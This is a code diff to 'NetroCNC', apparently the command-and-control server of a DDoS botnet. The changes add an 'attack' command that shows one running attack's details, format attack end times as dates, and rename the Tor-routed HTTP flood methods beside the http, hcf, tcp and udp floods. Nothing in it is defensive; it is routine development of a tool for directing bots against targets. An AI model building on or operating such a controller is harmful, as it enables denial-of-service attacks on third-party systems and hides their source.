@@ -1,4 +1,5 @@
 from urllib.parse import urlparse
+from datetime import datetime
 import threading
 import socket
 import random
@@ -128,6 +129,8 @@ class NetroCNC(object):
                 return self.command_bots()
             case "attacks":
                 return self.command_attacks()
+            case "attack":
+                return self.command_attack(args=args)
             case "launch":
                 return self.command_launch(args=args)
             case "clear":
@@ -183,7 +186,7 @@ class NetroCNC(object):
         if len(args) < 1:
             return "Missing command arguments. Type \"help\" to show the launch command manual."
         
-        attack_methods = ["http", "http-post", "http-tor", "hcf", "udp", "tcp"]
+        attack_methods = ["http", "http-post", "hcf", "tor-get", "tor-post", "tor-hcf", "tcp", "udp"]
         attack_method = args[0].lower()
 
         if not attack_method in attack_methods:
@@ -196,10 +199,14 @@ class NetroCNC(object):
                 return self.attack_method_http(args=args, http_method="http")
             case "http-post":
                 return self.attack_method_http(args=args, http_method="http-post")
-            case "http-tor":
-                return self.attack_method_http(args=args, http_method="http-tor")
             case "hcf":
                 return self.attack_method_http(args=args, http_method="hcf")
+            case "tor-get":
+                return self.attack_method_http(args=args, http_method="tor-get")
+            case "tor-post":
+                return self.attack_method_http(args=args, http_method="tor-post")
+            case "tor-hcf":
+                return self.attack_method_http(args=args, http_method="tor-hcf")
             case "tcp":
                 return self.attack_method_tcp(args=args)
             case "udp":
@@ -352,6 +359,25 @@ class NetroCNC(object):
     def generate_attack_id(self):
         return "".join(random.choices(string.ascii_letters + string.digits, k=10))
     
+    def command_attack(self, args: list):
+        try:
+            attack_id = args[0]
+        except Exception:
+            return "Missing argument: attack_id"
+        
+        running_attacks = self.get_running_attacks()
+
+        if not attack_id in running_attacks:
+            return "Attack not found."
+        
+        output = ""
+
+        for k in running_attacks[attack_id]:
+            v = running_attacks[attack_id][k]
+            output += f"{k}: {v}\n"
+        
+        return output
+
     def command_attacks(self):
         output = ""
 
@@ -370,8 +396,8 @@ class NetroCNC(object):
                 attack_payload = running_attacks[attack_id]
                 se1 = len(str(attack_id))
                 se2 = len(str(attack_payload["method"]))
-                se3 = len(str(attack_payload["target"]))
-                se4 = len(str(attack_payload["timeout"]))
+                se3 = len(str(attack_payload["target"][:50]))
+                se4 = len(str(datetime.fromtimestamp(attack_payload["timeout"]).strftime("%m-%d-%Y-%H:%M:%S")))
 
                 if se1 > sep1:
                     sep1 = se1 + 2
@@ -387,8 +413,11 @@ class NetroCNC(object):
                 attack_payload = running_attacks[attack_id]
                 method = str(attack_payload["method"])
                 target = str(attack_payload["target"])
-                timeout = str(attack_payload["timeout"])
+                timeout = str(datetime.fromtimestamp(attack_payload["timeout"]).strftime("%m-%d-%Y-%H:%M:%S"))
                 concurrency = str(attack_payload["concurrency"])
+
+                if len(target) > 50:
+                    target = f"{target[:47]}..."
 
                 output += f"{attack_id}{' ' * int(sep1 - len(attack_id))}{method}{' ' * int(sep2 - len(method))}{target}{' ' * int(sep3 - len(target))}{timeout}{' ' * int(sep4 - len(timeout))}{concurrency}\n"
 
